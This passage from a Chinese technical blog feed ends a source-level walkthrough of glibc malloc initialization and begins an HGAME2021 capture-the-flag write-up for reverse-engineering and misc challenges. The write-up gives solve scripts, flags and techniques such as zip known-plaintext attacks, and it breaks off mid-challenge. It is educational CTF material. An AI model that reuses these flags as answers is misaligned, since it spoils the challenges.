old_end</span></span><br><span class="line">          set_head (old_top, (size + old_size) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<span class="comment">// old_size = 0</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">            malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">       av);</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">// 进入 else</span></span><br><span class="line">          &#123;</span><br><span class="line">            front_misalign = <span class="number">0</span>;</span><br><span class="line">            end_misalign = <span class="number">0</span>;</span><br><span class="line">            correction = <span class="number">0</span>;</span><br><span class="line">            aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> (old_size)<span class="comment">// old_size = 0</span></span><br><span class="line">                  av-&gt;system_mem += brk - old_end;</span><br><span class="line">                <span class="comment">// 计算 correction 的值</span></span><br><span class="line">                ...</span><br><span class="line">                snd_brk = (<span class="keyword">char</span> *) (MORECORE (correction));<span class="comment">// correction 一般为 0，这一步的目的是使 snd_brk = 堆结束地址</span></span><br><span class="line">                <span class="keyword">if</span> (snd_brk == (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">                  &#123;</span><br><span class="line">                    ...</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="keyword">else</span><span class="comment">// 进入 else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="comment">// __after_morecore_hook 默认为 NULL</span></span><br><span class="line">                    <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">                    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                      (*hook)();</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                ...</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">if</span> (snd_brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))<span class="comment">// 满足条件</span></span><br><span class="line">              &#123;</span><br><span class="line">                av-&gt;top = (mchunkptr) aligned_brk;<span class="comment">// av-&gt;top = brk</span></span><br><span class="line">                set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<span class="comment">// 设置 top chunk 头部</span></span><br><span class="line">                av-&gt;system_mem += correction;</span><br><span class="line">                ...</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) av-&gt;system_mem &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (av-&gt;max_system_mem))</span><br><span class="line">  av-&gt;max_system_mem = av-&gt;system_mem;<span class="comment">// 设置 max_system_mem</span></span><br><span class="line"></span><br><span class="line">p = av-&gt;top;</span><br><span class="line">size = chunksize (p);<span class="comment">// size = 0x21000</span></span><br><span class="line"><span class="comment">// 最后在这里做分配，满足用户的第一次申请</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">// 分出去 nb 还剩多少</span></span><br><span class="line">    remainder = chunk_at_offset (p, nb);</span><br><span class="line">    av-&gt;top = remainder;<span class="comment">// 重新设置 top chunk 地址</span></span><br><span class="line">    set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);<span class="comment">// 设置它们的头</span></span><br><span class="line">    check_malloced_chunk (av, p, nb);<span class="comment">// 无事发生</span></span><br><span class="line">    <span class="keyword">return</span> chunk2mem (p);<span class="comment">// 返回用户可见地址</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* catch all failure paths */</span></span><br><span class="line">__set_errno (ENOMEM);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>sysmalloc 返回后回到 _int_malloc，再从不远处的 <code>return p;</code> 返回到 __libc_malloc，还记得吗：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)<span class="comment">// victim 此时为 heap 起始地址 + 8</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)<span class="comment">// 之前对 thread_arena 上锁了，这里解锁</span></span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line"><span class="keyword">return</span> victim;<span class="comment">// 返回用户期待的空间</span></span><br></pre></td></tr></table></figure><p>最后返回到 __malloc_hook，再返回到最初调用的 __libc_malloc，因为 __libc_malloc 中调用 __malloc_hook 后会直接返回，所以用户就拿到了申请的空间。至此，第一次 malloc 调用全流程分析完毕。</p><br><h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><ul><li>__libc_malloc<ul><li>__malloc_hook(malloc_hook_ini)<ul><li>ptmalloc_init：根据环境变量配置内存分配选项</li><li>__libc_malloc<ul><li>arena_get：获取线程的 malloc_state 结构体地址，作为 _int_malloc 的一个参数</li><li>_int_malloc<ul><li>malloc_consolidate：进入 else 分支<ul><li>malloc_init_state：初始化 malloc_state 结构体的一些字段</li></ul></li><li>sysmalloc(use top)：正式申请、设置 top chunk，分割 top chunk，返回满足用户申请大小的空间</li></ul></li><li>返回到 __libc_malloc</li></ul></li><li>返回到 __malloc_hook</li></ul></li><li>返回到 __libc_malloc</li></ul></li><li>返回申请的空间</li></ul><br><p>PS. 如果第一次 malloc 的大小超出了 smallbin 的范围，怎么调用 malloc_consolidate 来初始化？<br>答：还是可以在 _int_malloc 的大循环前调用 malloc_consolidate：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      ... <span class="comment">// nb 在 smallbin 范围内时，在这里调用 malloc_consolidate</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">// 此时 av-&gt;flags 为 0，判断成立</span></span><br><span class="line">        malloc_consolidate (av);<span class="comment">// nb 超出 smallbin 范围，在这里调用 malloc_consolidate</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关于 have_fastchunks</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br></pre></td></tr></table></figure><br><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>gdb 源码级调试 malloc：<a href="https://moddemod.blog.csdn.net/article/details/106580966">https://moddemod.blog.csdn.net/article/details/106580966</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2021 Re&amp;Misc wp</title>
      <link href="/2021/02/27/HGAME2021-Re-Misc-wp/"/>
      <url>/2021/02/27/HGAME2021-Re-Misc-wp/</url>
      
        <content type="html"><![CDATA[<p>为期 4 个星期的 HGAME2021 结束了，今年的 hgame 依然有着较高质量的题目和出题人的手把手 hint，可以说对👴这样的萌新很友好。所有的题目里我只做了 Re 和 Misc 的，没办法太菜了其他的不敢染指，题目（re/pwn/misc）及官方 wp 我都整理到了 <a href="https://pan.baidu.com/s/193dK07RIaDHFhD0aQRAp3Q">网盘</a>（提取码：3oyi），8说了，自闭去了</p><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h4><blockquote><p>分值：150pts</p><p>描述：一杯阿帕茶</p></blockquote><p>main 函数：</p><p><img src="../img/hgame2021/1.png" alt="hgame2021"></p><p>输入 35 个字符，程序将每个字符零扩展成四字节，保存在元素个数为 35 的 DWORD 数组中作为明文，用已知的 key 进行 xxtea 加密，结果与已知的数组比较。脚本（xxtea 函数是网上找的）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z &gt;&gt; 5 ^ y <span class="meta-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>* v, <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123; <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">                y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">                z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">35</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">3880694563u</span>, <span class="number">3081185334u</span>, <span class="number">1506439138u</span>, <span class="number">2524759489u</span>,</span><br><span class="line">        <span class="number">3883935348u</span>, <span class="number">1026381030u</span>, <span class="number">2325545814u</span>, <span class="number">2581382044u</span>,</span><br><span class="line">        <span class="number">1881594093u</span>, <span class="number">1781792173u</span>, <span class="number">4103492874u</span>, <span class="number">1553756062u</span>,</span><br><span class="line">        <span class="number">468045900u</span>, <span class="number">1730391575u</span>, <span class="number">1383114178u</span>, <span class="number">2890011402u</span>,</span><br><span class="line">        <span class="number">2227070898u</span>, <span class="number">1885128569u</span>, <span class="number">1548828056u</span>, <span class="number">4214676013u</span>,</span><br><span class="line">        <span class="number">571971141u</span>, <span class="number">1558401693u</span>, <span class="number">3515474427u</span>, <span class="number">3898332297u</span>,</span><br><span class="line">        <span class="number">1942540575u</span>, <span class="number">1421197718u</span>, <span class="number">3061626000u</span>, <span class="number">555214026u</span>,</span><br><span class="line">        <span class="number">2648963476u</span>, <span class="number">794468778u</span>, <span class="number">2816999933u</span>, <span class="number">3272437419u</span>,</span><br><span class="line">        <span class="number">464379036u</span>, <span class="number">877899850u</span>, <span class="number">2460223225u</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;</span><br><span class="line">    <span class="built_in">xxtea</span>(v, <span class="number">-35</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hgame&#123;l00ks_1ike_y0u_f0Und_th3_t34&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h4><blockquote><p>分值：150pts</p><p>描述：Welcome to reverse world !</p></blockquote><p>shift + F12 查找字符串 “checking flag” 的交叉引用，来到函数 sub_1400014C0，逻辑很简单：</p><p><img src="../img/hgame2021/2.png" alt="hgame2021"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">target = <span class="string">&quot;97 99 9C 91 9E 81 91 9D 9B 9A 9A AB 81 97 AE 80 83 8F 94 89 99 97&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">b = <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">  flag += <span class="built_in">chr</span>(t ^ b)</span><br><span class="line">  b -= <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="comment"># hgame&#123;hello_re_player&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h4><blockquote><p>分值：150pts</p><p>描述：pypy。<strong>flag的格式为hgame{your_flag_here}</strong></p></blockquote><p>题目是一个 python 程序的字节码，阅读一遍后还原 python 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">raw_flag = <span class="built_in">input</span>(<span class="string">&quot;give me your flag:\n&quot;</span>)</span><br><span class="line">cipher = <span class="built_in">list</span>(raw_flag[<span class="number">6</span>:-<span class="number">1</span>])</span><br><span class="line">length = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>], cipher[<span class="number">2</span>*i]</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">res.append(<span class="built_in">ord</span>(cipher[i]) ^ i)</span><br><span class="line">res = <span class="built_in">bytes</span>(res).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;your flag: &quot;</span> + res)</span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = []</span><br><span class="line">res = <span class="string">&quot;30466633346f59213b4139794520572b45514d61583151576638643a&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">cipher.append(<span class="built_in">ord</span>(res[i]) ^ i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res) // <span class="number">2</span>):</span><br><span class="line">cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>], cipher[<span class="number">2</span>*i]</span><br><span class="line">cipher = <span class="built_in">map</span>(<span class="built_in">chr</span>, cipher)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(cipher)</span><br><span class="line"><span class="comment"># hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span></span><br></pre></td></tr></table></figure><br><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h4><blockquote><p>分值：50pts</p><p>描述：新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？</p></blockquote><p>base64 -&gt; base32 -&gt; base16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b32decode, b16decode</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09&quot;</span></span><br><span class="line"><span class="built_in">print</span> b16decode(b32decode(b64decode(data)))</span><br><span class="line"><span class="comment"># hgame&#123;We1c0me_t0_HG4M3_2021&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h4><blockquote><p>分值：100pts</p><p>描述：0x4qE给了张图给我，说这图暗藏玄机，你能帮我找出来吗？</p></blockquote><p>图片备注里有提示 <code>Secret hidden IN picture.</code>，binwalk 分离得到一个 zip 压缩包。打开发现备注里提示 <code>Password is picture ID</code>，那肯定是 P 站的 ID 了，百度识图找到 ID 为 <code>70415155</code></p><p>解压得到一个文本文档和一个压缩包，而这个 txt 恰好在 plain.zip 里也有，明文攻击得到口令 <code>C8uvP$DP</code></p><p>解压得到 flag.zip，该压缩包是伪加密，将文件偏移 0x11E 处的 01 改成 00 后解压，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</span><br></pre></td></tr></table></figure><p>这是 html 转义字符，可以创建一个 flag.html，将上面的内容复制进去，再用浏览器打开，得到 flag <code>hgame&#123;2IP_is_Usefu1_and_Me9umi_i5_W0r1d&#125;</code></p><br><h4 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h4><blockquote><p>分值：100pts</p><p>描述：Akira的信物：用于提升Akira的潜能。一张藏着秘密的星空壁纸，不幸的是似乎在某次行动中遗失了。</p></blockquote><p>跟踪 tcp 流 26，将图片导出，把 png 高度改大点，得到 flag <code>hgame&#123;Wh4t_A_W0nderfu1_Wa11paper&#125;</code></p><br><h4 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h4><blockquote><p>分值：150pts</p><p>描述：timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？</p></blockquote><p>first.docx 后缀改为 zip 解压，在 word 目录下有一个 password.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br></pre></td></tr></table></figure><p>妥妥的 brainfuck，解码得到 <code>DOYOUKNOWHIDDEN?</code>，是 maimai.docx 的密码。打开 maimai.docx，图片下面有隐藏文字，选中它们，右键字体，取消勾选隐藏文字后，发现其由空格和 tab 组成，联系图片想到 snow 隐写。将其复制到 snow.txt 中：</p><p><img src="../img/hgame2021/16.png" alt="hgame2021"></p><p>ubuntu 下使用指令 <code>stegsnow -C snow.txt</code>，得到 flag <code>hgame&#123;Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX&#125;</code></p><br><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h3><h4 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h4><blockquote><p>分值：200pts</p><p>描述：input your flag to check！</p></blockquote><p>jadx 打开 apk，在 com.ryen.ezapk.MainActivity 类中找到 onClick 方法，和 flag 有关的只有一句判断：</p><p><img src="../img/hgame2021/3.png" alt="hgame2021"></p><p>由于存在混淆，许多符号被替换成了单个字母，不过不影响通过函数行为判断其作用。c.d.b.a.a 方法的代码：</p><p><img src="../img/hgame2021/4.png" alt="hgame2021"></p><p>不难看出是 isEqual，由此可知  <code>MainActivity.s(mainActivity3, editText2.getText().toString())</code> 的返回值就是 flag，其中 <code>editText2.getText()</code> 就是输入。MainActivity.s 对输入进行了加密：</p><p><img src="../img/hgame2021/5.png" alt="hgame2021"></p><p>可以发现，key 和 iv 都被 mainActivity.t 函数处理了：</p><p><img src="../img/hgame2021/6.png" alt="hgame2021"></p><p>该函数的作用是对 str2 进行 str 指定的 hash 算法，于是 key 为 sha256(R.string.key)，iv 为 md5(R.string.key)，R.string.flag 和 R.string.key 都可以从资源文件中取到（路径在 resources.arsc/res/values/strings.xml）：</p><p><img src="../img/hgame2021/7.png" alt="hgame2021"></p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256, md5</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;</span></span><br><span class="line">cipher = b64decode(ori)</span><br><span class="line"></span><br><span class="line">key = sha256(<span class="string">&quot;A_HIDDEN_KEY&quot;</span>).digest()</span><br><span class="line">iv = md5(<span class="string">&quot;A_HIDDEN_KEY&quot;</span>).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span> aes.decrypt(cipher).rstrip()</span><br><span class="line"><span class="comment"># hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h4><blockquote><p>分值：250pts</p><p>描述：Input 2 passwords and get your flag !</p></blockquote><p>main 函数中验证第一个密码的部分：</p><p><img src="../img/hgame2021/8.png" alt="hgame2021"></p><p>将输入（16个字符）视作 128 位的数值与 xmmword_4030F0 比较，所以 <code>pwd1 = 2b0c5e6a3a20b189</code>。pwd1 正确后，程序：</p><ul><li>以暂停状态创建新进程</li><li>通过 CreateFileMappingA 